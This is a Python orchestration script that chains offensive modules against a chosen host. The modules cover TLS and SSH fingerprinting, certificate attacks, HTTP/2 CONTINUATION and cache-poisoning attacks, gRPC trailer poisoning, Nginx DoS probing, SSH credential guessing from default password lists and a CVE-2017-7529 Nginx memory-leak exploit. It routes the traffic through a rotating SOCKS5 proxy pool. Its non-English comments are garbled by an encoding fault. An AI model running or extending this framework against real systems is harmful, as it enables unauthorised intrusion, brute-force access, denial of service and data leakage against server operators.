#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Integrated Orchestrator
Unifies all security modules with robust error handling, timeouts, and phase orchestration.

Design goals:
- Complete coverage of existing tools (no feature loss)
- Seamless data flow between phases (fingerprints -> cert/xDS/Wasm -> H2/GRPC/TLS13/EC)
- Strong error and timeout handling with clear, normalized results
- Configurable CLI (select phases, timeouts, parallelism, output format)
"""

from __future__ import annotations

import asyncio
import json
import sys
import time
import logging
from pathlib import Path


# Module-level logger to avoid NameError in free functions  
logger = logging.getLogger('integrated_orchestrator')

#  SYSTEM REFACTORING: Import shared communication infrastructure
try:
    from .shared_protocol_client import SharedProtocolClient, get_shared_client, cleanup_shared_clients
    SHARED_CLIENT_AVAILABLE = True
    logger.info(" Shared protocol client loaded - system refactoring active")
except ImportError:
    SHARED_CLIENT_AVAILABLE = False
    logger.warning(" Shared protocol client not available - using legacy implementations")

#  Universal Dynamic Integrator - ç»ˆæé›†æˆè§£å†³æ–¹æ¡ˆ
try:
    # å°è¯•ç›¸å¯¹å¯¼å…¥
    from .universal_integrator import UniversalIntegrator, integrate_all_modules
    UNIVERSAL_INTEGRATOR_AVAILABLE = True
    logger.info(" Universal Dynamic Integrator loaded - zero-loss integration active")
except ImportError:
    try:
        # å¦‚æœç›¸å¯¹å¯¼å…¥å¤±è´¥ï¼Œå°è¯•ç›´æ¥å¯¼å…¥
        from universal_integrator import UniversalIntegrator, integrate_all_modules
        UNIVERSAL_INTEGRATOR_AVAILABLE = True
        logger.info(" Universal Dynamic Integrator loaded via direct import")
    except ImportError as e:
        UNIVERSAL_INTEGRATOR_AVAILABLE = False
        logger.warning(f" Universal Dynamic Integrator not available: {e}")

def _load_proxy_from_file(proxy_file: str) -> Optional[str]:
    """ä»æ–‡ä»¶åŠ è½½ä»£ç†URL"""
    try:
        proxy_path = Path(proxy_file)
        if not proxy_path.exists():
            print(f"[!] ä»£ç†æ–‡ä»¶ä¸å­˜åœ¨: {proxy_file}")
            print(f"[!] åˆ›å»ºæ–‡ä»¶å¹¶å†™å…¥ä»£ç†URL: echo 'socks5://user:pass@host:port' > {proxy_file}")
            return None
            
        with open(proxy_path, 'r', encoding='utf-8') as f:
            proxy_url = f.read().strip()
            
        if not proxy_url:
            print(f"[!] ä»£ç†æ–‡ä»¶ä¸ºç©º: {proxy_file}")
            return None
            
        if not proxy_url.startswith('socks5://'):
            print(f"[!] ä»£ç†URLæ ¼å¼é”™è¯¯ï¼Œå¿…é¡»ä»¥ socks5:// å¼€å¤´")
            return None
            
        # åªæ˜¾ç¤ºå‰20ä¸ªå­—ç¬¦ï¼Œéšè—å¯†ç 
        safe_display = proxy_url[:20] + "***@" + proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url[:30] + "***"
        print(f"[+] åŠ è½½ä»£ç†: {safe_display}")
        return proxy_url
        
    except Exception as e:
        print(f"[!] è¯»å–ä»£ç†æ–‡ä»¶å¤±è´¥: {e}")
        return None


from dataclasses import dataclass
from datetime import datetime
from typing import Any, Dict, List, Optional
import re

# å¯¼å…¥ç»Ÿä¸€ä»£ç†ç®¡ç†å™¨
try:
    from .unified_proxy_manager import init_global_proxy, get_proxy_manager, apply_proxy_to_module
    UNIFIED_PROXY_AVAILABLE = True
except ImportError:
    try:
        from unified_proxy_manager import init_global_proxy, get_proxy_manager, apply_proxy_to_module
        UNIFIED_PROXY_AVAILABLE = True
    except ImportError:
        UNIFIED_PROXY_AVAILABLE = False
        logger.warning("Unified Proxy Manager not available")
import time

# ç®€å•çš„æƒ…æŠ¥ç®¡ç†å™¨ - ä¸è¿‡åº¦å·¥ç¨‹åŒ–
class SimpleIntel:
    def __init__(self):
        self.data = {}
    
    def set(self, phase: str, result: Dict[str, Any]):
        self.data[phase] = result
    
    def get_server_type(self) -> str:
        fp = self.data.get('fingerprint', {})
        if 'server' in fp:
            return fp['server'].lower()
        return 'unknown'
    
    def get_san_domains(self) -> List[str]:
        cert = self.data.get('certificate_attacks', {})
        return cert.get('san_domains', [])


# -------- Utilities: error handling, timeouts, and normalization --------

@dataclass
class PhaseResult:
    name: str
    success: bool
    data: Dict[str, Any]
    error: Optional[str] = None
    duration_ms: int = 0


def _now_iso() -> str:
    return datetime.now().isoformat()


async def run_with_timeout(coro, timeout: float, phase_name: str) -> PhaseResult:
    start = time.perf_counter()
    try:
        result = await asyncio.wait_for(coro, timeout=timeout)
        duration_ms = int((time.perf_counter() - start) * 1000)
        # Normalize result into dict
        if isinstance(result, dict):
            data = result
        elif isinstance(result, (list, str, int, float, bool)):
            data = {"result": result}
        else:
            data = {"result": str(result)}
        return PhaseResult(name=phase_name, success=True, data=data, duration_ms=duration_ms)
    except asyncio.TimeoutError:
        duration_ms = int((time.perf_counter() - start) * 1000)
        return PhaseResult(name=phase_name, success=False, data={}, error=f"timeout after {timeout}s", duration_ms=duration_ms)
    except Exception as e:
        duration_ms = int((time.perf_counter() - start) * 1000)
        # å¯¹äºä¸¥é‡çš„ä»£ç é”™è¯¯ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¸­æ–­æ‰§è¡Œ
        if isinstance(e, (TypeError, AttributeError, ImportError, SyntaxError)):
            print(f"[FATAL] Critical code error in {phase_name}: {type(e).__name__}: {e}")
            raise e
        return PhaseResult(name=phase_name, success=False, data={}, error=f"{type(e).__name__}: {e}", duration_ms=duration_ms)


async def run_sync_in_thread(fn, *args, timeout: float = 10.0, phase_name: str, **kwargs) -> PhaseResult:
    async def _runner():
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(None, lambda: fn(*args, **kwargs))
    return await run_with_timeout(_runner(), timeout, phase_name)


def safe_import(module_name: str):
    try:
        return __import__(module_name, fromlist=['*'])
    except Exception as e:
        return e  # Return the exception for graceful handling


# -------- Adapters for each module --------

# ========== å¢å¼ºçš„ä»£ç†æ± ç®¡ç† ==========
class ProxyPoolManager:
    """ç»Ÿä¸€çš„ä»£ç†æ± ç®¡ç†å™¨ï¼Œæ”¯æŒå¹¶å‘å’Œæ•…éšœè½¬ç§»"""
    
    def __init__(self, proxy_urls: List[str] = None):
        self.proxy_urls = proxy_urls or []
        self.current_index = 0
        self.lock = asyncio.Lock()
        self.failed_proxies = set()
        
    async def get_proxy(self) -> Optional[str]:
        """è·å–ä¸‹ä¸€ä¸ªå¯ç”¨ä»£ç†"""
        async with self.lock:
            if not self.proxy_urls:
                return None
            
            # è·³è¿‡å¤±è´¥çš„ä»£ç†
            attempts = 0
            while attempts < len(self.proxy_urls):
                proxy = self.proxy_urls[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxy_urls)
                
                if proxy not in self.failed_proxies:
                    return proxy
                attempts += 1
            
            # å¦‚æœæ‰€æœ‰ä»£ç†éƒ½å¤±è´¥ï¼Œé‡ç½®å¤±è´¥åˆ—è¡¨é‡è¯•
            if self.failed_proxies:
                logger.warning("All proxies failed, resetting failed list")
                self.failed_proxies.clear()
                return self.proxy_urls[0] if self.proxy_urls else None
            
            return None
    
    def mark_failed(self, proxy: str):
        """æ ‡è®°ä»£ç†ä¸ºå¤±è´¥"""
        self.failed_proxies.add(proxy)
        logger.warning(f"Marked proxy as failed: {proxy[:30]}...")

# å…¨å±€ä»£ç†æ± å®ä¾‹
_global_proxy_pool: Optional[ProxyPoolManager] = None

def init_proxy_pool(proxy_urls: List[str]):
    """åˆå§‹åŒ–å…¨å±€ä»£ç†æ± """
    global _global_proxy_pool
    _global_proxy_pool = ProxyPoolManager(proxy_urls)
    logger.info(f"Initialized proxy pool with {len(proxy_urls)} proxies")

async def get_pooled_proxy() -> Optional[str]:
    """ä»ä»£ç†æ± è·å–ä»£ç†"""
    if _global_proxy_pool:
        return await _global_proxy_pool.get_proxy()
    return None

# ========== å¢å¼ºçš„æ–¹æ³•é›†æˆ ==========

async def phase_smart_detect(host: str, ports: List[int]) -> PhaseResult:
    phase = "smart_detection"
    mod = safe_import('smart_detector')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        results = mod.pre_detect_services(host, ports)
        return results

    return await run_with_timeout(_run(), 30.0, phase)


async def phase_fingerprint(host: str, tls_port: int, http_port: int, timeout: float, smart_ctx: Dict[str, Any] = None, proxy_url: Optional[str] = None, ssh_port: int = 22000) -> PhaseResult:
    phase = "fingerprint"
    mod = safe_import('fingerprint_proxy')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    # è®¾ç½®proxyé…ç½® 
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            # åŠ¨æ€è®¾ç½®proxyé…ç½®
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # åŒæ—¶æ›´æ–°æ¨¡å—å†…éƒ¨çš„å…¨å±€å˜é‡
        import fingerprint_proxy
        fingerprint_proxy.PROXY_URL = proxy_url
        fingerprint_proxy.PROXY_ENABLED = True

    data: Dict[str, Any] = {}
    tasks: List[asyncio.Task] = []

    # cert_rebel_probe (sync)
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.cert_rebel_probe, host, tls_port, [host], 22000, timeout,
            phase_name=f"{phase}.cert_rebel_probe"
        )))
    except Exception as e:
        data['cert_rebel_probe_error'] = str(e)

    # run_ssh_fp (sync) - ä½¿ç”¨å¤šç«¯å£æ£€æµ‹
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_ssh_fp_multi_ports, host, timeout=timeout,
            phase_name=f"{phase}.ssh_fp"
        )))
    except Exception as e:
        data['ssh_fp_error'] = str(e)

    # run_tls_fp (sync)
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_tls_fp, host, tls_port, timeout=timeout, server_name=host,
            phase_name=f"{phase}.tls_fp"
        )))
    except Exception as e:
        data['tls_fp_error'] = str(e)

    # run_http_fp (sync)
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_http_fp, host, http_port, timeout=timeout,
            phase_name=f"{phase}.http_fp"
        )))
    except Exception as e:
        data['http_fp_error'] = str(e)

    # run_http_extreme_fp (sync) - optional stress
    try:
        tasks.append(asyncio.create_task(run_sync_in_thread(
            mod.run_http_extreme_fp, host, http_port, timeout=timeout,
            phase_name=f"{phase}.http_extreme_fp"
        )))
    except Exception as e:
        data['http_extreme_error'] = str(e)

    # Gather
    async def _run():
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, PhaseResult):
                key = res.name.split('.', 1)[-1]
                if res.success:
                    data[key] = res.data.get('result') if 'result' in res.data else res.data
                    # è¾“å‡ºæŒ‡çº¹å·¥ä½œæˆæœ
                    if key == 'ssh_fp' and res.data.get('result'):
                        print(f"[+] SSH fingerprint: {len(res.data['result'])} templates analyzed")
                    elif key == 'tls_fp' and res.data.get('result'):
                        print(f"[+] TLS fingerprint: {len(res.data['result'])} handshakes completed")
                    elif key == 'http_fp' and res.data.get('result'):
                        print(f"[+] HTTP fingerprint: {len(res.data['result'])} probes executed")
                    elif key == 'cert_rebel_probe' and res.data.get('result'):
                        cert_data = res.data['result']
                        if isinstance(cert_data, tuple) and len(cert_data) >= 2:
                            tls_rows, ssh_rows = cert_data[0], cert_data[1]
                            print(f"[+] Certificate analysis: {len(tls_rows)} certificates, {len(ssh_rows)} SSH keys")
                else:
                    data[f"{key}_error"] = res.error
                    print(f"[-] {key} failed: {res.error}")
            else:
                data.setdefault('errors', []).append(str(res))

        # åˆå¹¶smart detectionç»“æœ
        if smart_ctx:
            data['smart_detection'] = smart_ctx
            
        return data

    return await run_with_timeout(_run(), timeout, phase)


async def phase_cert_rebel(host: str, tls_port: int, timeout: float, fingerprint_ctx: Dict[str, Any], proxy_url: Optional[str] = None, origin_ip: Optional[str] = None) -> PhaseResult:
    phase = "certificate_attacks"
    
    # åœ¨å¯¼å…¥å‰è®¾ç½®ä»£ç†é…ç½®ï¼Œç¡®ä¿æ¨¡å—åˆå§‹åŒ–æ—¶å°±èƒ½è·å–é…ç½®
    if proxy_url:
        import sys
        # åˆ›å»ºä¸´æ—¶æ¨¡å—æ¥è®¾ç½®å…¨å±€ä»£ç†å˜é‡
        temp_module = type(sys)('proxy_config')
        temp_module.PROXY_URL = proxy_url
        temp_module.PROXY_ENABLED = True
        sys.modules['proxy_config'] = temp_module
    
    mod = safe_import('cert_sociology')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    # å†æ¬¡è®¾ç½®proxyé…ç½®ï¼Œç¡®ä¿ç”Ÿæ•ˆ
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # åŒæ—¶æ›´æ–°æ¨¡å—å†…éƒ¨çš„å…¨å±€å˜é‡
        import cert_sociology
        cert_sociology.PROXY_URL = proxy_url
        cert_sociology.PROXY_ENABLED = True

    async def _run():
        attacker = mod.CertRebelAttacks(host, tls_port, timeout=timeout, origin_ip=origin_ip)
        if hasattr(attacker, 'set_fingerprint_context') and fingerprint_ctx:
            attacker.set_fingerprint_context(fingerprint_ctx)
        return await attacker.run_all_attacks(None, None)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_ocsp(host: str, tls_port: int, timeout: float) -> PhaseResult:
    phase = "ocsp_validation"
    mod = safe_import('ocsp_validator')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        validator = mod.OCSPValidator(host, tls_port, timeout=timeout)
        return await validator.verify_ocsp_soft_fail()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_h2_continuation(host: str, tls_port: int, timeout: float, fingerprint_ctx: Dict[str, Any], cert_ctx: Dict[str, Any], proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "h2_continuation"
    
    #  SYSTEM REFACTORING: Always use shared protocol client for stability
    if SHARED_CLIENT_AVAILABLE:
        # Test HTTP/2 connectivity with reliable shared client
        client = get_shared_client(host, tls_port, timeout=timeout)
        h2_result = await client.test_http2_connectivity()
        
        if not h2_result.get('supported', False):
            logger.info(f"HTTP/2 not supported via shared client, providing diagnostic report")
            return PhaseResult(name=phase, success=True, data={
                'http2_supported': False,
                'reason': h2_result.get('error', 'HTTP/2 not supported'),
                'diagnostics': h2_result.get('diagnostics', {}),
                'recommendations': h2_result.get('recommendations', []),
                'via_shared_client': True
            })
        
        logger.info("HTTP/2 connectivity verified via shared client, proceeding with CONTINUATION attacks")
        
        # ğŸ†• NEW: Use shared client for attacks instead of legacy h2_cfs
        async def _run():
            return await client.execute_h2_continuation_attacks()
        
        return await run_with_timeout(_run(), timeout, phase)
    
    else:
        logger.warning("Shared protocol client not available, using httpx-based HTTP/2 implementation")
    
    # Load h2_cfs module for actual attacks
    mod = safe_import('h2_cfs')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®proxyé…ç½®
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        attacker = mod.H2ContinuationConfusion(
            target_host=host, target_port=tls_port, timeout=timeout,
            fingerprint_data=fingerprint_ctx or {}, cert_data=cert_ctx or {}
        )
        return await attacker.run_all_attacks()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_h2_cache_poison(host: str, tls_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "h2_cache_poisoning"
    mod = safe_import('h2_push_poisoning')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®proxyé…ç½®
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        tool = mod.H2PushPoisoning(host, tls_port, timeout=timeout)
        return await tool.run_poisoning_campaign()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_grpc(host: str, grpc_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "grpc_trailer_poisoning"
    mod = safe_import('grpc_trailer_poisoning')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®proxyé…ç½®
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # åŒæ—¶æ›´æ–°æ¨¡å—å†…éƒ¨çš„å…¨å±€å˜é‡
        import grpc_trailer_poisoning
        grpc_trailer_poisoning.PROXY_URL = proxy_url
        grpc_trailer_poisoning.PROXY_ENABLED = True

    async def _run():
        attacker = mod.GrpcTrailerPoisoning(host, grpc_port, timeout=timeout)
        return await attacker.run_comprehensive_assessment()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_xds(host: str, xds_port: int, timeout: float, event_cb=None) -> PhaseResult:
    phase = "xds_analysis"
    mod = safe_import('xds_protocol_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        analyzer = mod.XDSProtocolAnalyzer(host, xds_port, timeout=timeout)
        if hasattr(analyzer, 'set_event_callback') and event_cb:
            analyzer.set_event_callback(event_cb)
        return await analyzer.comprehensive_xds_analysis()

    return await run_with_timeout(_run(), timeout, phase)


async def phase_wasm(host: str, web_port: int, timeout: float, posture: str = 'intelligent') -> PhaseResult:
    phase = "wasm_runtime"
    mod = safe_import('wasm_runtime_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
        return await analyzer.comprehensive_wasm_security_analysis(posture=posture)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_tls13_psk(host: str, tls_port: int, timeout: float, sni_list: Optional[List[str]], proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "tls13_psk_crossbind"
    mod = safe_import('tls13_psk_crossbind')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®proxyé…ç½®
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        attacker = mod.TLS13PSKCrossBind(host, tls_port, timeout=timeout)
        snis = sni_list or [host]
        return await attacker.run_comprehensive_assessment(snis)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_ec_aoe(host: str, tls_port: int, timeout: float, protocols: Optional[List[str]], proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "elliptic_curve_aoe"
    mod = safe_import('ec_aoe')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®proxyé…ç½®
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)
        
        # åŒæ—¶æ›´æ–°æ¨¡å—å†…éƒ¨çš„å…¨å±€å˜é‡
        import ec_aoe
        ec_aoe.PROXY_URL = proxy_url
        ec_aoe.PROXY_ENABLED = True

    async def _run():
        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
        return await attacker.run_comprehensive_assessment(protos)

    # EC AOEä¼˜åŒ–ç­–ç•¥ï¼šåˆ†å±‚æ¢æµ‹ + åŠ¨æ€è¶…æ—¶è°ƒæ•´
    # å¯¹äºåˆ†å±‚æ¢æµ‹ï¼Œå¦‚æœå¹¿åº¦æ‰«æå‘ç°å¼‚å¸¸ç«¯ç‚¹å¾ˆå°‘ï¼Œå¯ä»¥æå‰å®Œæˆ
    effective_timeout = 1800.0  # ğŸ’€ åŸºç¡€é¢„ç®—30åˆ†é’Ÿ - æš´åŠ›å»¶é•¿æ—¶é—´ï¼
    
    async def _run_with_progress():
        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
        
        # Start assessment with progress monitoring
        logging.info(f"EC AOE: Starting layered assessment with {effective_timeout}s budget")
        start_time = time.perf_counter()
        result = await attacker.run_comprehensive_assessment(protos)
        
        actual_duration = time.perf_counter() - start_time
        logging.info(f"EC AOE: Completed in {actual_duration:.1f}s (budget: {effective_timeout}s)")
        
        return result
    
    return await run_with_timeout(_run_with_progress(), effective_timeout, phase)


async def phase_nginx_dos(host: str, web_port: int, timeout: float) -> PhaseResult:
    phase = "nginx_dos_sandwich"
    mod = safe_import('nginx_dos_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        analyzer = mod.NginxDoSAnalyzer(host, web_port, timeout=timeout)
        probe = await analyzer.nginx_dos_sandwich_probe()
        # Also include external architecture detection for context
        arch = await analyzer.detect_cloud_native_architecture(scan_mode='external')
        return {"dos_analysis": probe, "cloud_native_analysis": arch}

    return await run_with_timeout(_run(), timeout, phase)


async def phase_universal_integration(host: str, port: int, timeout: float) -> PhaseResult:
    """ Universal Dynamic Integration - é›¶é—æ¼æ–¹æ³•æ‰§è¡Œ"""
    phase = "universal_integration"
    
    if not UNIVERSAL_INTEGRATOR_AVAILABLE:
        return PhaseResult(name=phase, success=False, data={}, error="Universal Integrator not available")
    
    async def _run():
        logger.info(" Starting Universal Dynamic Integration - Zero-Loss Mode")
        
        # æ‰€æœ‰ç›®æ ‡æ¨¡å—
        target_modules = [
            'h2_cfs',  # æ“ï¼è¿™ä¸ªæ ¸å¿ƒæ¨¡å—ç«Ÿç„¶æ¼äº†ï¼
            'wasm_runtime_analyzer',
            'nginx_dos_analyzer', 
            'grpc_trailer_poisoning',
            'tls13_psk_crossbind',
            'xds_protocol_analyzer',
            'proto_norm_diff_v2'
        ]
        
        # æ‰§è¡Œé›¶é—æ¼é›†æˆ
        results = await integrate_all_modules(host, port, timeout * 2)  # ç»™è¶³å¤Ÿæ—¶é—´
        
        # ç»Ÿè®¡æˆåŠŸç‡
        summary = results.get('execution_report', {}).get('summary', {})
        success_rate = summary.get('success_rate', 0)
        total_methods = summary.get('total', 0)
        successful_methods = summary.get('successful', 0)
        
        logger.info(f" Universal Integration Complete: {successful_methods}/{total_methods} methods ({success_rate:.1f}% success)")
        
        return {
            'integration_results': results,
            'summary': {
                'total_methods_discovered': total_methods,
                'successful_executions': successful_methods, 
                'success_rate': success_rate,
                'modules_processed': len(target_modules)
            }
        }
    
    return await run_with_timeout(_run(), timeout * 3, phase)  # è¶³å¤Ÿçš„è¶…æ—¶æ—¶é—´


async def phase_time_mch_first_door(host: str, ssh_port: int, timeout: float) -> PhaseResult:
    phase = "time_mch_first_door"
    mod = safe_import('time_mch')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        # Uses default user/password lists inside the module
        return await mod.first_door_attack(host, ssh_port)

    return await run_with_timeout(_run(), timeout, phase)


async def phase_proto_norm_diff(host: str, tls_port: int, timeout: float, survey_only: bool = False, proxy_url: Optional[str] = None) -> PhaseResult:
    phase = "proto_norm_diff_survey" if survey_only else "proto_norm_diff"
    # å¼ºåˆ¶ä½¿ç”¨ v2 ç‰ˆæœ¬ (httpx-based, ä¸å†fallbackåˆ°æ‰‹æ“HTTP/2å®ç°)
    mod = safe_import('proto_norm_diff_v2')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"proto_norm_diff_v2 import failed: {mod}. Legacy v1 is deprecated due to HTTP/2 connectivity issues.")
    
    tool_class = mod.ProtoNormDiffV2
    logger.info("Using proto_norm_diff v2 (httpx-based HTTP/2 implementation)")
    
    # è®¾ç½®proxyé…ç½®ï¼ˆv2 ç‰ˆæœ¬æš‚æ—¶ä¸æ”¯æŒä»£ç†ï¼Œä½†ä¿ç•™å…¼å®¹æ€§ï¼‰
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
        else:
            setattr(mod, 'PROXY_URL', proxy_url)
            setattr(mod, 'PROXY_ENABLED', True)

    async def _run():
        tool = tool_class(host, tls_port, timeout=timeout)
        await tool.survey_topology()
        
        if survey_only:
            # åªè¿”å›å¿«é€Ÿ survey ç»“æœï¼Œç”¨äºä¾¦å¯Ÿé˜¶æ®µ
            return {"survey": tool.survey}
        
        # è¿è¡Œå®Œæ•´çŸ©é˜µåˆ†æ
        return await tool.run_matrix(None)

    # ä¼˜åŒ–è¶…æ—¶ç®¡ç†ï¼šå¢åŠ proto_norm_diffé¢„ç®—åˆ°300ç§’ä»¥æ”¯æŒå¹¶å‘ä¼˜åŒ–
    effective_timeout = 300.0 if not survey_only else timeout
    return await run_with_timeout(_run(), effective_timeout, phase)


async def phase_cve_2017_7529(host: str, web_port: int, timeout: float, target_domain: Optional[str] = None) -> PhaseResult:
    """CVE-2017-7529 Nginx memory leak exploit"""
    phase = "cve_2017_7529"
    mod = safe_import('exploit_cve_2017_7529')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        # ä½¿ç”¨ HTTPS ç«¯å£ï¼ˆé€šå¸¸ä¸ TLS ç«¯å£ç›¸åŒï¼‰
        target_url = f"https://{host}:{web_port}/"
        leaker = mod.NginxMemoryLeaker(target_url)
        
        # æ‰§è¡Œå†…å­˜æ³„éœ²æ”»å‡»
        findings = leaker.targeted_leak()
        
        # åˆ†æç»“æœ - å‡†ç¡®åˆ¤æ–­æ¼æ´çŠ¶æ€
        has_206_responses = any('206' in str(f) for f in findings) if findings else False
        
        result = {
            'vulnerable': len(findings) > 0 and has_206_responses,
            'findings_count': len(findings),
            'findings': findings[:10],
            'risk_level': 'CRITICAL' if (findings and has_206_responses) else 'LOW',
            'version_vulnerable': True,  # nginx/1.12.2 is vulnerable by version
            'exploit_successful': len(findings) > 0 and has_206_responses,
            'analysis': 'Patched or behind WAF' if not has_206_responses else 'Active vulnerability'
        }
        
        # å¦‚æœæä¾›äº†ç›®æ ‡åŸŸåï¼Œä¹Ÿæµ‹è¯•å¸¦ Host å¤´çš„è¯·æ±‚
        if target_domain and findings:
            leaker.session.headers['Host'] = target_domain
            domain_findings = leaker.exploit()
            if domain_findings:
                result['domain_findings'] = domain_findings[:5]
                result['findings_count'] += len(domain_findings)
        
        return result

    return await run_with_timeout(_run(), timeout, phase)


# ========== æ–°å¢ï¼šproto_norm_diff å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_proto_norm_export_evidence(host: str, tls_port: int, timeout: float, out_dir: str, proxy_url: Optional[str] = None) -> PhaseResult:
    """å¯¼å‡ºproto_norm_diffçš„è¯æ®æ–‡ä»¶"""
    phase = "proto_norm_export_evidence"
    mod = safe_import('proto_norm_diff')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        effective_proxy = proxy_url or await get_pooled_proxy()
        tool = mod._DeprecatedProtoNormDiff(host, tls_port, timeout=timeout, proxy_url=effective_proxy)
        
        # å…ˆè¿è¡Œåˆ†æ
        await tool.run_matrix()
        
        # å¯¼å‡ºè¯æ®
        tool.export_evidence(out_dir)
        
        return {"exported": True, "out_dir": out_dir, "files_created": ["heatmap.csv", "evidence.json"]}
    
    return await run_with_timeout(_run(), timeout * 2, phase)

async def phase_proto_norm_v2_analyze(host: str, tls_port: int, timeout: float, dimensions: Optional[List[str]] = None) -> PhaseResult:
    """proto_norm_diff_v2 å¢å¼ºåˆ†æï¼ˆåŒ…å«çŠ¶æ€å›¾ï¼‰"""
    phase = "proto_norm_v2_analyze"
    mod = safe_import('proto_norm_diff_v2')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        tool = mod.ProtoNormDiffV2(host, tls_port, timeout=timeout)
        return await tool.analyze(dimensions=dimensions)
    
    return await run_with_timeout(_run(), timeout * 3, phase)

# ========== æ–°å¢ï¼šnginx_dos_analyzer å®Œæ•´æ–¹æ³•é›†æˆ ==========

async def phase_nginx_config_traps(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """æ£€æµ‹Nginxé…ç½®é™·é˜±"""
    phase = "nginx_config_traps"
    mod = safe_import('nginx_dos_analyzer')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # è®¾ç½®ä»£ç†
    if proxy_url:
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = proxy_url
            mod.PROXY_ENABLED = True
    
    async def _run():
        analyzer = mod.NginxDoSAnalyzer(host, web_port, timeout=timeout)
        return await analyzer.detect_config_traps()
    
    return await run_with_timeout(_run(), timeout, phase)

